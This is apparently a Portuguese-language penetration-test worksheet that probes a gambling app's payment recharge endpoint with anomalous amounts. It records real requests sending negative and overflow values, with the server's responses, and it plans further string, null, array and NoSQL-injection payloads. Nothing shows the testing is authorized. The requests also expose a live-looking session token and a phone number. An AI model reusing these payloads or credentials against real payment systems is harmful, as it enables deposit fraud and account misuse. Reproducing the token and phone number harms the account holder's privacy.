# B1 — Depósito com valor anômalo

**Endpoint:** `POST /prod-api/pay-service/recharge`
**Objetivo:** Verificar se o backend aceita valores negativos, zero,
strings, arrays ou operadores NoSQL no campo `amount`.

---

## Request original (referência — antes de modificar)

> Capture o depósito normal de R$ 10 e cole aqui inteiro. Isso me dá a
> estrutura completa que vou comparar com as variantes.

```
<cola aqui: POST + headers + body>
```

```
<cola a response normal aqui também>
```

---

## Payload 1 — `"amount": -100`

> **Variantes testadas:** `-20`, `-2` (sessão 2026-06-08).
> **Fonte:** `_sessao_2026-06-08.md`

### Request (amount=-20)
```
POST /prod-api/pay-service/recharge HTTP/2
Host: ds.amizade777.com
Token: 137027:1780956891:3001:7964d1412a3f879b5472841e51bf735f
Content-Type: application/json

{"token":"137027:1780956891:3001:7964d1412a3f879b5472841e51bf735f","appPackageName":"com.slots.big","appVersion":"1.0.0","phone":"21998498419","configId":"","amount":-20,"qr":1}
```

### Response
```
HTTP/2 200 OK
{"code":103012,"msg":"Valor de recarga errado, por favor verifique"}
```

### Request (amount=-2)
```
... mesma estrutura, "amount":-2
```

### Response
```
HTTP/2 200 OK
{"code":103012,"msg":"Valor de recarga errado, por favor verifique"}
```

### Observação
- Saldo NÃO mudou (esperado).
- Backend valida `amount > 0` antes de chamar o gateway de pagamento.
- Erro `103012` é retornado **antes** de qualquer interação com banco.
- Status 200 OK (HTTP) com erro lógico no body — padrão da API.

---

## Payload 2 — `"amount": -1`

### Request
```
```

### Response
```
```

### Observação
-

---

## Payload 3 — `"amount": 0`

### Request
```
```

### Response
```
```

### Observação
-

---

## Payload 4 — `"amount": 0.000000001`

### Request
```
```

### Response
```
```

### Observação
-

---

## Payload 5 — `"amount": 9007199254740991` (Number.MAX_SAFE_INTEGER)

> **Testado em:** sessão 2026-06-08.
> **Fonte:** `_sessao_2026-06-08.md`

### Request
```
POST /prod-api/pay-service/recharge HTTP/2
Host: ds.amizade777.com
Token: 137027:1780956891:3001:7964d1412a3f879b5472841e51bf735f
Content-Type: application/json

{"token":"137027:1780956891:3001:7964d1412a3f879b5472841e51bf735f","appPackageName":"com.slots.big","appVersion":"1.0.0","phone":"21998498419","configId":"","amount":9007199254740991,"qr":1}
```

### Response
```
HTTP/2 200 OK
{"code":103014,"msg":"No available channel."}
```

### Observação
- Erro `103014` — diferente do `103012` dos negativos.
- Provavelmente passou da validação de `amount > 0` mas o gateway de pagamento (canal) não aceita o valor (overflow no provider).
- **Importante:** essa mensagem é em INGLÊS enquanto a outra é em PT-BR — provável vazamento de língua interna do gateway.
- Não confirma se o **backend interno** aceitou; pode ter sido o **provider** que recusou.
- **Próximo teste recomendado:** valores grandes mas dentro do max do gateway (ex.: 99999, 100000, 999999, 1000000).

---

## Payload 6 — `"amount": "999999"` (string em vez de número)

### Request
```
```

### Response
```
```

### Observação
-

---

## Payload 7 — `"amount": null`

### Request
```
```

### Response
```
```

### Observação
-

---

## Payload 8 — `"amount": [10, -100]` (array)

### Request
```
```

### Response
```
```

### Observação
-

---

## Payload 9 — `"amount": {"$ne": 0}` (NoSQL injection)

### Request
```
```

### Response
```
```

### Observação
-

---

## Resumo

- Algum payload aceito?
- Algum erro 500 (vazou stacktrace)?
- Saldo final após todos os testes:
